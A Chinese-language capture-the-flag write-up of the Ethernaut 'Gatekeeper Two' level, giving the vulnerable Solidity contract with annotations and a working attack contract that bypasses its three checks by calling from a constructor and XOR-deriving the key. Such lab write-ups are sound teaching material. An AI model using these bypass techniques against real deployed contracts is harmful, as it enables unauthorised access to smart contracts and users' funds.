### 第十四题 Gatekeeper Two
### 题目
注册为参赛者来完成这一关
### 提示
- 想一想你从上一个守门人那学到了什么.
- 第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 Solidity Assembly . extcodesize 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 yellow paper.
- ^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 Solidity cheatsheet). Coin Flip 关卡也是一个很好的参考.
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        //assembly：这是Solidity中的一个关键字，用于编写内联汇编代码。
        //内联汇编允许你直接在Solidity代码中编写EVM（以太坊虚拟机）指令，以实现更低级别的操作。
        assembly {
        //extcodesize(caller()) 返回调用者地址的代码大小。如果调用者是一个合约地址，则返回其代码大小；
        //如果调用者是一个普通地址（外部账户），则返回 0。
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        //keccak256(abi.encodePacked(msg.sender))：哈希函数，将 msg.sender编码并计算其 Keccak-256 哈希值
        //type(uint64).max：这是 uint64 类型的最大值，即 2^64 - 1
        //这行代码的作用是确保 uint64 类型的哈希值与 _gateKey 进行异或运算后的结果等于 uint64 类型的最大值。
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
### 解题思路&过程
大致同第一题，攻击代码:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract attack {
    constructor(address _victim) {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = _victim.call(payload);
        require(success, "failed somewhere...");
    }
}
```
